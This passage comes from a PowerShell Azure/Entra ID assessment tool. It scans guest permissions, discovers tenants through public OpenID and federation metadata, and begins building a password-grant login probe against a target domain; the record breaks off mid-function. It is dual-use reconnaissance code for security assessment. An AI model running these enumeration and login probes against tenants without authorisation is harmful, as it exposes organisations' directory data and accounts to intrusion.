            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Try Graph context
            if (-not $detectedDomain) {
                try {
                    $context = Get-MgContext -ErrorAction SilentlyContinue
                    if ($context -and $context.Account -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from Graph context: $detectedDomain" -Color "Green"
                    }
                } catch {
                    # Silent
                }
            }
        } catch {
            # Silent catch
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Yellow"
            Write-ColorOutput -Message "[*] Skipping domain-specific unauthenticated checks" -Color "Yellow"
            Write-ColorOutput -Message "[*] Use -Domain parameter for full enumeration`n" -Color "DarkGray"
        }
    }
    
    $scanResults.Domain = $Domain
    
    # 1.1 Check if external collaboration is enabled (unauthenticated)
    if ($Domain) {
        Write-ColorOutput -Message "[*] Testing external collaboration configuration..." -Color "Yellow"
        
        $guestConfig = Test-GuestLoginEnabled -Domain $Domain
        $scanResults.Phase1_Unauthenticated.GuestConfiguration = $guestConfig
        
        if ($guestConfig.TenantExists) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists" -Color "Green"
            
            if ($guestConfig.AcceptsExternalUsers) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[!] External collaboration: ENABLED" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "ExternalCollaboration"
                    Risk = "MEDIUM"
                    Description = "Tenant accepts external/guest users (B2B collaboration enabled)"
                    Recommendation = "Review guest user access policies and implement conditional access"
                }
                $scanResults.RiskScore += 30
            } else {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External collaboration: Appears restricted" -Color "Green"
            }
            
            if ($guestConfig.IsFederated) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: $($guestConfig.FederationType)" -Color "Cyan"
            }
        } else {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found" -Color "Red"
            return
        }
        
        Write-ColorOutput -Message ""
    }
    
    # ============================================
    # PHASE 2: AUTHENTICATED CHECKS (GUEST PERMISSIONS)
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 2: Authenticated Enumeration (Guest Permission Testing)" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Check if we can connect to Graph
    $graphConnected = $false
    $isGuest = $false
    $currentUser = $null
    
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        if ($context) {
            $graphConnected = $true
            $currentUser = $context.Account
            Write-ColorOutput -Message "[+] Using existing Graph connection: $currentUser" -Color "Green"
        }
    } catch {
        # Not connected yet
    }
    
    if (-not $graphConnected) {
        Write-ColorOutput -Message "[*] Attempting to connect to Microsoft Graph..." -Color "Yellow"
        try {
            # Request scopes needed for guest permission testing
            Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Device.Read.All","Application.Read.All","Directory.Read.All","Policy.Read.All" -ErrorAction Stop
            $context = Get-MgContext
            $graphConnected = $true
            $currentUser = $context.Account
            Write-ColorOutput -Message "[+] Connected as: $currentUser" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph" -Color "Yellow"
            Write-ColorOutput -Message "[*] Authenticated checks will be skipped" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Error: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    if ($graphConnected) {
        # Check if current user is a guest
        $isGuest = Test-IsGuestUser -UserPrincipalName $currentUser
        
        if ($isGuest) {
            Write-ColorOutput -Message "[!] GUEST USER DETECTED - Testing guest permission boundaries" -Color "Yellow"
            Write-ColorOutput -Message "[*] This simulates the 'Azure Null Session' attack scenario`n" -Color "Yellow"
        } else {
            Write-ColorOutput -Message "[*] MEMBER USER - Testing what guests could access" -Color "Cyan"
            Write-ColorOutput -Message "[*] Results show potential guest enumeration capabilities`n" -Color "Cyan"
        }
        
        $scanResults.Phase2_Authenticated.IsGuest = $isGuest
        $scanResults.Phase2_Authenticated.CurrentUser = $currentUser
        
        # 2.1 Get guest permission policy
        Write-ColorOutput -Message "[*] Checking guest permission policy..." -Color "Yellow"
        
        $guestPermPolicy = Get-GuestPermissionLevel
        $scanResults.Phase2_Authenticated.GuestPermissionPolicy = $guestPermPolicy
        
        if ($guestPermPolicy.Success) {
            $policyColor = if ($guestPermPolicy.IsVulnerable) { "Red" } elseif ($guestPermPolicy.IsRestricted) { "Green" } else { "Yellow" }
            Write-ColorOutput -Message "    [*] Guest Permission Level: $($guestPermPolicy.PermissionLevel)" -Color $policyColor
            
            if ($guestPermPolicy.IsVulnerable) {
                Write-ColorOutput -Message "    [!] CRITICAL: Guests have SAME permissions as members!" -Color "Red"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestPermissions"
                    Risk = "CRITICAL"
                    Description = "Guest users have same permissions as member users (GuestUserRoleId: a0b1b346-4d3e-4e8b-98f8-753987be4970)"
                    Recommendation = "Change to restricted mode: Set-MgPolicyAuthorizationPolicy -GuestUserRoleId '2af84b1e-32c8-42b7-82bc-daa82404023b'"
                }
                $scanResults.RiskScore += 50
            } elseif (-not $guestPermPolicy.IsRestricted) {
                Write-ColorOutput -Message "    [!] WARNING: Guest permissions are not fully restricted" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestPermissions"
                    Risk = "MEDIUM"
                    Description = "Guest users have limited but not fully restricted permissions"
                    Recommendation = "Consider restricting guest access to most restrictive level"
                }
                $scanResults.RiskScore += 20
            } else {
                Write-ColorOutput -Message "    [+] Guest permissions are properly restricted" -Color "Green"
            }
        } else {
            Write-ColorOutput -Message "    [!] Could not retrieve guest permission policy" -Color "Red"
        }
        
        # 2.2 Get external collaboration settings
        Write-ColorOutput -Message "`n[*] Checking external collaboration settings..." -Color "Yellow"
        
        $collabSettings = Get-ExternalCollaborationSettings
        $scanResults.Phase2_Authenticated.CollaborationSettings = $collabSettings
        
        if ($collabSettings.Success) {
            Write-ColorOutput -Message "    [*] Guest invitations allowed from: $($collabSettings.AllowInvitesFrom)" -Color "Cyan"
            
            if ($collabSettings.AllowInvitesFrom -eq "everyone") {
                Write-ColorOutput -Message "    [!] WARNING: All users can invite guests" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestInvitations"
                    Risk = "LOW"
                    Description = "All users in the organization can invite guest users"
                    Recommendation = "Restrict guest invitations to admins only"
                }
                $scanResults.RiskScore += 10
            }
        }
        
        # 2.3 Test actual guest permissions by attempting to enumerate resources
        Write-ColorOutput -Message "`n[*] Testing guest access to directory resources..." -Color "Yellow"
        
        $permissionTests = @("Users", "Groups", "Devices", "Applications", "DirectoryRoles")
        $accessibleResources = @()
        
        foreach ($testType in $permissionTests) {
            Write-ColorOutput -Message "    [*] Testing access to: $testType..." -Color "DarkGray"
            $testResult = Test-GuestUserPermissions -TestType $testType
            
            if ($testResult.Accessible) {
                Write-ColorOutput -Message "    [+] $testType : ACCESSIBLE (Found $($testResult.ItemCount) items)" -Color "Green"
                $accessibleResources += $testType
                
                # This is a vulnerability if user is a guest
                if ($isGuest) {
                    $scanResults.Vulnerabilities += [PSCustomObject]@{
                        Type = "GuestEnumeration"
                        Risk = "HIGH"
                        Description = "Guest user can enumerate $testType - Azure Null Session equivalent"
                        Recommendation = "Review and restrict guest access to $testType"
                        ResourceType = $testType
                        ItemCount = $testResult.ItemCount
                    }
                    $scanResults.RiskScore += 15
                }
            } else {
                Write-ColorOutput -Message "    [-] $testType : BLOCKED" -Color "DarkGray"
            }
        }
        
        $scanResults.Phase2_Authenticated.AccessibleResources = $accessibleResources
        $scanResults.Phase2_Authenticated.PermissionTests = $permissionTests
        
        # 2.4 Compare guest vs member access
        Write-ColorOutput -Message "`n[*] Access Level Summary:" -Color "Yellow"
        Write-ColorOutput -Message "    Current User Type: $(if ($isGuest) { 'GUEST' } else { 'MEMBER' })" -Color $(if ($isGuest) { "Yellow" } else { "Cyan" })
        Write-ColorOutput -Message "    Accessible Resources: $($accessibleResources.Count) / $($permissionTests.Count)" -Color "Cyan"
        
        if ($isGuest -and $accessibleResources.Count -gt 0) {
            Write-ColorOutput -Message "    [!] VULNERABILITY: Guest can enumerate $($accessibleResources.Count) resource type(s)" -Color "Red"
        }
    }
    
    # ============================================
    # PHASE 3: SECURITY ASSESSMENT REPORT
    # ============================================
    Write-ColorOutput -Message "`n[*] PHASE 3: Security Assessment Report" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Calculate final risk score and rating
    $riskRating = if ($scanResults.RiskScore -ge 70) { "CRITICAL" }
                  elseif ($scanResults.RiskScore -ge 40) { "HIGH" }
                  elseif ($scanResults.RiskScore -ge 20) { "MEDIUM" }
                  else { "LOW" }
    
    $riskColor = switch ($riskRating) {
        "CRITICAL" { "Red" }
        "HIGH" { "Yellow" }
        "MEDIUM" { "Yellow" }
        "LOW" { "Green" }
    }
    
    Write-ColorOutput -Message "[*] Overall Risk Score: $($scanResults.RiskScore) / 100" -Color $riskColor
    Write-ColorOutput -Message "[*] Risk Rating: $riskRating" -Color $riskColor
    Write-ColorOutput -Message "[*] Vulnerabilities Found: $($scanResults.Vulnerabilities.Count)" -Color $(if ($scanResults.Vulnerabilities.Count -gt 0) { "Yellow" } else { "Green" })
    
    if ($scanResults.Vulnerabilities.Count -gt 0) {
        Write-ColorOutput -Message "`n[*] Vulnerability Details:" -Color "Yellow"
        
        foreach ($vuln in $scanResults.Vulnerabilities) {
            $vulnColor = switch ($vuln.Risk) {
                "CRITICAL" { "Red" }
                "HIGH" { "Red" }
                "MEDIUM" { "Yellow" }
                "LOW" { "DarkGray" }
            }
            
            Write-ColorOutput -Message "`n    [$($vuln.Risk)] $($vuln.Type)" -Color $vulnColor
            Write-ColorOutput -Message "    Description: $($vuln.Description)" -Color "DarkGray"
            Write-ColorOutput -Message "    Recommendation: $($vuln.Recommendation)" -Color "Cyan"
        }
    }
    
    # Summary
    $scanResults.Summary = @{
        RiskScore = $scanResults.RiskScore
        RiskRating = $riskRating
        VulnerabilityCount = $scanResults.Vulnerabilities.Count
        CriticalCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "CRITICAL" }).Count
        HighCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "HIGH" }).Count
        MediumCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "MEDIUM" }).Count
        LowCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "LOW" }).Count
    }
    
    Write-ColorOutput -Message "`n[*] Scan Complete!" -Color "Green"
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".json") {
                $scanResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Full report exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".csv") {
                $scanResults.Vulnerabilities | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "[+] Vulnerabilities exported to: $ExportPath" -Color "Green"
            } else {
                $scanResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Report exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Recommendations
    Write-ColorOutput -Message "`n[*] Next Steps:" -Color "Yellow"
    if ($scanResults.RiskScore -ge 40) {
        Write-ColorOutput -Message "    1. Review and restrict guest user permissions immediately" -Color "Cyan"
        Write-ColorOutput -Message "    2. Implement Conditional Access policies for guest users" -Color "Cyan"
        Write-ColorOutput -Message "    3. Audit existing guest accounts and remove unnecessary ones" -Color "Cyan"
        Write-ColorOutput -Message "    4. Enable guest access reviews in Azure Entra ID" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "    1. Continue monitoring guest user activity" -Color "Cyan"
        Write-ColorOutput -Message "    2. Review guest access policies periodically" -Color "Cyan"
        Write-ColorOutput -Message "    3. Implement logging and alerting for guest enumeration" -Color "Cyan"
    }
    
    Write-ColorOutput -Message ""
}

# Tenant discovery function
function Invoke-TenantDiscovery {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        # Try to get the domain from the current user's UPN
        $detectedDomain = $null
        
        try {
            # Method 1: Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 2: Try environment variable for USERDNSDOMAIN
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 3: Try to get domain from current user's email-like username
            if (-not $detectedDomain) {
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                if ($currentUser -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
                } elseif ($currentUser -match '(.+)\\') {
                    $domainName = $matches[1]
                    # Check if it's not a local machine name by checking if it looks like a NETBIOS name
                    if ($domainName -ne $env:COMPUTERNAME -and $domainName.Length -le 15) {
                        Write-ColorOutput -Message "[*] Detected NETBIOS domain: $domainName" -Color "Yellow"
                        Write-ColorOutput -Message "[!] Please provide the full DNS domain name for tenant discovery" -Color "Yellow"
                    }
                }
            }
        } catch {
            # Silent catch - we'll handle the error below
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: .\azx.ps1 tenant -Domain example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Tenant Discovery" -Color "Yellow"
    Write-ColorOutput -Message "[*] Target Domain: $Domain`n" -Color "Yellow"
    
    # Construct the OpenID configuration URLs
    $openIdConfigUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
    $commonOpenIdConfigUrl = "https://login.microsoftonline.com/common/v2.0/.well-known/openid-configuration"
    
    Write-ColorOutput -Message "[*] Querying OpenID configuration endpoints..." -Color "Yellow"
    
    try {
        # Query the tenant-specific OpenID configuration endpoint
        $openIdConfig = Invoke-RestMethod -Uri $openIdConfigUrl -Method Get -ErrorAction Stop
        
        Write-ColorOutput -Message "[+] Successfully retrieved tenant configuration`n" -Color "Green"
        
        # Extract tenant ID from the issuer or token_endpoint
        $tenantId = $null
        if ($openIdConfig.issuer) {
            if ($openIdConfig.issuer -match '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})') {
                $tenantId = $matches[1]
            }
        }
        
        # Determine federation status
        $isFederated = $false
        if ($openIdConfig.tenant_region_scope -or $openIdConfig.tenant_region_sub_scope) {
            $isFederated = $true
        }
        
        # Format output in netexec style
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Tenant Discovery" -Color "Cyan"
        Write-ColorOutput -Message ""
        
        # Display key information
        if ($tenantId) {
            Write-ColorOutput -Message "    [+] Tenant ID:                $tenantId" -Color "Green"
        }
        
        if ($openIdConfig.issuer) {
            Write-ColorOutput -Message "    [+] Issuer:                   $($openIdConfig.issuer)" -Color "Cyan"
        }
        
        if ($openIdConfig.authorization_endpoint) {
            Write-ColorOutput -Message "    [+] Authorization Endpoint:   $($openIdConfig.authorization_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.token_endpoint) {
            Write-ColorOutput -Message "    [+] Token Endpoint:           $($openIdConfig.token_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.userinfo_endpoint) {
            Write-ColorOutput -Message "    [+] UserInfo Endpoint:        $($openIdConfig.userinfo_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.end_session_endpoint) {
            Write-ColorOutput -Message "    [+] End Session Endpoint:     $($openIdConfig.end_session_endpoint)" -Color "Cyan"
        }
        
        if ($openIdConfig.jwks_uri) {
            Write-ColorOutput -Message "    [+] JWKS URI:                 $($openIdConfig.jwks_uri)" -Color "Cyan"
        }
        
        if ($openIdConfig.tenant_region_scope) {
            Write-ColorOutput -Message "    [+] Tenant Region Scope:      $($openIdConfig.tenant_region_scope)" -Color "Cyan"
        }
        
        if ($openIdConfig.tenant_region_sub_scope) {
            Write-ColorOutput -Message "    [+] Tenant Region SubScope:   $($openIdConfig.tenant_region_sub_scope)" -Color "Cyan"
        }
        
        if ($openIdConfig.cloud_instance_name) {
            Write-ColorOutput -Message "    [+] Cloud Instance:           $($openIdConfig.cloud_instance_name)" -Color "Cyan"
        }
        
        if ($openIdConfig.cloud_graph_host_name) {
            Write-ColorOutput -Message "    [+] Graph Host:               $($openIdConfig.cloud_graph_host_name)" -Color "Cyan"
        }
        
        Write-ColorOutput -Message "    [+] Federation Status:        $(if ($isFederated) { 'Federated' } else { 'Managed' })" -Color $(if ($isFederated) { "Yellow" } else { "Green" })
        
        # Additional metadata
        Write-ColorOutput -Message "`n    [*] Supported Response Types: $($openIdConfig.response_types_supported -join ', ')" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Supported Scopes:         $($openIdConfig.scopes_supported -join ', ')" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Supported Claims:         $($openIdConfig.claims_supported.Count) claims available" -Color "DarkGray"
        
        # Enumerate exposed applications and misconfigurations
        Write-ColorOutput -Message "`n[*] Enumerating exposed applications and configurations..." -Color "Yellow"
        
        $exposedApps = @()
        $exposedRedirectUris = @()
        $misconfigurations = @()
        
        # Check for common OpenID misconfigurations
        if ($openIdConfig.response_types_supported -contains "token" -or 
            $openIdConfig.response_types_supported -contains "id_token token") {
            $misconfigurations += "Implicit flow enabled (potential security risk)"
            Write-ColorOutput -Message "    [!] Implicit flow enabled (security consideration)" -Color "Yellow"
        }
        
        # Check for exposed redirect URIs in the configuration
        if ($openIdConfig.PSObject.Properties.Name -contains "redirect_uris") {
            $exposedRedirectUris = $openIdConfig.redirect_uris
            Write-ColorOutput -Message "    [!] Found $($exposedRedirectUris.Count) exposed redirect URI(s)" -Color "Yellow"
            foreach ($uri in $exposedRedirectUris) {
                Write-ColorOutput -Message "        - $uri" -Color "Cyan"
            }
        }
        
        # Try to enumerate federation metadata (for federated tenants)
        if ($isFederated) {
            Write-ColorOutput -Message "`n[*] Attempting to retrieve federation metadata..." -Color "Yellow"
            $federationMetadataUrl = "https://login.microsoftonline.com/$Domain/FederationMetadata/2007-06/FederationMetadata.xml"
            
            try {
                $fedMetadata = Invoke-RestMethod -Uri $federationMetadataUrl -Method Get -ErrorAction SilentlyContinue
                if ($fedMetadata) {
                    Write-ColorOutput -Message "    [+] Federation metadata accessible" -Color "Green"
                    
                    # Extract entity IDs and endpoints from federation metadata
                    if ($fedMetadata.EntityDescriptor) {
                        $entityId = $fedMetadata.EntityDescriptor.entityID
                        Write-ColorOutput -Message "    [+] Federation Entity ID: $entityId" -Color "Cyan"
                    }
                }
            } catch {
                # Silent catch - federation metadata may not be available
            }
        }
        
        # Check common v2.0 endpoint for additional metadata
        try {
            $commonConfig = Invoke-RestMethod -Uri $commonOpenIdConfigUrl -Method Get -ErrorAction SilentlyContinue
            if ($commonConfig) {
                # Compare configurations to identify tenant-specific settings
                $differences = @()
                
                # Check for additional grant types
                if ($openIdConfig.PSObject.Properties.Name -contains "grant_types_supported") {
                    Write-ColorOutput -Message "`n    [*] Supported Grant Types:" -Color "DarkGray"
                    foreach ($grantType in $openIdConfig.grant_types_supported) {
                        Write-ColorOutput -Message "        - $grantType" -Color "DarkGray"
                        
                        # Flag potentially risky grant types
                        if ($grantType -eq "password" -or $grantType -eq "client_credentials") {
                            Write-ColorOutput -Message "          [!] Note: $grantType grant type enabled" -Color "Yellow"
                        }
                    }
                }
            }
        } catch {
            # Silent catch
        }
        
        # Try to probe for exposed application endpoints
        Write-ColorOutput -Message "`n[*] Probing for exposed application information..." -Color "Yellow"
        
        # Check for app registration endpoint exposure
        $appEndpoints = @(
            "https://graph.microsoft.com/.well-known/openid-configuration",
            "https://management.azure.com/metadata/endpoints?api-version=2021-01-01"
        )
        
        foreach ($endpoint in $appEndpoints) {
            try {
                $response = Invoke-RestMethod -Uri $endpoint -Method Get -ErrorAction SilentlyContinue -TimeoutSec 5
                if ($response) {
                    Write-ColorOutput -Message "    [+] Accessible endpoint: $endpoint" -Color "Green"
                    
                    # Extract any exposed client IDs or app IDs
                    if ($response.PSObject.Properties.Name -contains "client_id") {
                        $exposedApps += $response.client_id
                    }
                }
            } catch {
                # Silent catch - endpoint not accessible
            }
        }
        
        # Summary of findings
        if ($exposedApps.Count -gt 0 -or $exposedRedirectUris.Count -gt 0 -or $misconfigurations.Count -gt 0) {
            Write-ColorOutput -Message "`n[*] Security Findings:" -Color "Yellow"
            
            if ($exposedApps.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Exposed Application IDs: $($exposedApps.Count)" -Color "Yellow"
                foreach ($app in $exposedApps) {
                    Write-ColorOutput -Message "        - $app" -Color "Cyan"
                }
            }
            
            if ($exposedRedirectUris.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Exposed Redirect URIs: $($exposedRedirectUris.Count)" -Color "Yellow"
            }
            
            if ($misconfigurations.Count -gt 0) {
                Write-ColorOutput -Message "    [!] Potential Misconfigurations: $($misconfigurations.Count)" -Color "Yellow"
                foreach ($config in $misconfigurations) {
                    Write-ColorOutput -Message "        - $config" -Color "Yellow"
                }
            }
        } else {
            Write-ColorOutput -Message "`n    [*] No exposed applications or obvious misconfigurations detected" -Color "Green"
        }
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                $exportData = [PSCustomObject]@{
                    Domain                    = $Domain
                    TenantId                  = $tenantId
                    Issuer                    = $openIdConfig.issuer
                    AuthorizationEndpoint     = $openIdConfig.authorization_endpoint
                    TokenEndpoint             = $openIdConfig.token_endpoint
                    UserInfoEndpoint          = $openIdConfig.userinfo_endpoint
                    EndSessionEndpoint        = $openIdConfig.end_session_endpoint
                    JwksUri                   = $openIdConfig.jwks_uri
                    TenantRegionScope         = $openIdConfig.tenant_region_scope
                    TenantRegionSubScope      = $openIdConfig.tenant_region_sub_scope
                    CloudInstanceName         = $openIdConfig.cloud_instance_name
                    CloudGraphHostName        = $openIdConfig.cloud_graph_host_name
                    FederationStatus          = if ($isFederated) { "Federated" } else { "Managed" }
                    ResponseTypesSupported    = $openIdConfig.response_types_supported
                    ScopesSupported           = $openIdConfig.scopes_supported
                    ClaimsSupported           = $openIdConfig.claims_supported
                    ExposedApplications       = $exposedApps
                    ExposedRedirectUris       = $exposedRedirectUris
                    PotentialMisconfigurations = $misconfigurations
                    FullConfiguration         = $openIdConfig
                }
                
                if ($extension -eq ".csv") {
                    $exportData | Select-Object -Property * -ExcludeProperty FullConfiguration,ExposedApplications,ExposedRedirectUris,PotentialMisconfigurations | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } else {
                    # Default to JSON
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                
                Write-ColorOutput -Message "`n[+] Tenant information exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        Write-ColorOutput -Message "`n[*] Tenant discovery complete!" -Color "Green"
        
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve tenant configuration" -Color "Red"
        Write-ColorOutput -Message "[!] Error: $_" -Color "Red"
        
        # Check if it's a 400 error (invalid tenant)
        if ($_.Exception.Response.StatusCode -eq 400) {
            Write-ColorOutput -Message "[!] The specified domain does not appear to be a valid Azure/Entra tenant" -Color "Yellow"
        }
    }
}

# Enumerate vulnerable targets (Azure equivalent of --gen-relay-list)
function Invoke-VulnListEnumeration {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Vulnerable Target Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Vuln-List (Azure Relay Target Equivalent)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb 192.168.1.0/24 --gen-relay-list`n" -Color "Yellow"
    
    $vulnTargets = @()
    $unauthFindings = @()
    $authFindings = @()
    
    # ============================================
    # PHASE 1: UNAUTHENTICATED CHECKS
    # ============================================
    Write-ColorOutput -Message "[*] PHASE 1: Unauthenticated Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            # Method 1: Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 2: Try environment variable for USERDNSDOMAIN
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 3: Try to get domain from current user's email-like username
            if (-not $detectedDomain) {
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                if ($currentUser -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 4: Check if already connected to Graph
            if (-not $detectedDomain) {
                try {
                    $context = Get-MgContext -ErrorAction SilentlyContinue
                    if ($context -and $context.Account -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from Graph context: $detectedDomain" -Color "Green"
                    }
                } catch {
                    # Silent - Graph not connected yet
                }
            }
        } catch {
            # Silent catch - we'll handle the error below
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Yellow"
            Write-ColorOutput -Message "[*] Skipping domain-specific unauthenticated checks" -Color "Yellow"
            Write-ColorOutput -Message "[*] Use -Domain parameter for full enumeration`n" -Color "DarkGray"
        }
    }
    
    # 1.1 Check tenant configuration (unauthenticated)
    if ($Domain) {
        Write-ColorOutput -Message "[*] Checking tenant configuration for: $Domain" -Color "Yellow"
        
        $openIdConfigUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
        
        try {
            $openIdConfig = Invoke-RestMethod -Uri $openIdConfigUrl -Method Get -ErrorAction Stop
            
            # Extract tenant ID
            $tenantId = $null
            if ($openIdConfig.issuer -match '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})') {
                $tenantId = $matches[1]
            }
            
            Write-ColorOutput -Message "    [+] Tenant ID: $tenantId" -Color "Green"
            
            # Check for implicit flow (OAuth misconfiguration)
            if ($openIdConfig.response_types_supported -contains "token" -or 
                $openIdConfig.response_types_supported -contains "id_token token") {
                $finding = [PSCustomObject]@{
                    Type = "TenantConfig"
                    Target = $Domain
                    Vulnerability = "ImplicitFlowEnabled"
                    Risk = "MEDIUM"
                    Description = "Implicit OAuth flow enabled - potential token theft risk"
                    Authenticated = $false
                }
                $unauthFindings += $finding
                Write-ColorOutput -Message "    [!] IMPLICIT FLOW ENABLED - Token theft risk" -Color "Yellow"
            }
            
        } catch {
            Write-ColorOutput -Message "    [!] Could not retrieve tenant configuration" -Color "Red"
        }
        
        # 1.2 Check external collaboration / guest access settings
        Write-ColorOutput -Message "`n[*] Testing guest/external authentication..." -Color "Yellow"
        
        $guestTestUrl = "https://login.microsoftonline.com/$Domain/oauth2/v2.0/token"
        $testBody = @{
            client_id     = "1b730954-1685-4b74-9bfd-dac224a7b894"  # Azure PowerShell client
            grant_type    = "password"
            username      = "nonexistent_test_user_12345@$Domain"
            password      = "TestPassword123!"
            scope         = "https://graph.microsoft.com/.default"
        }
        
        try {
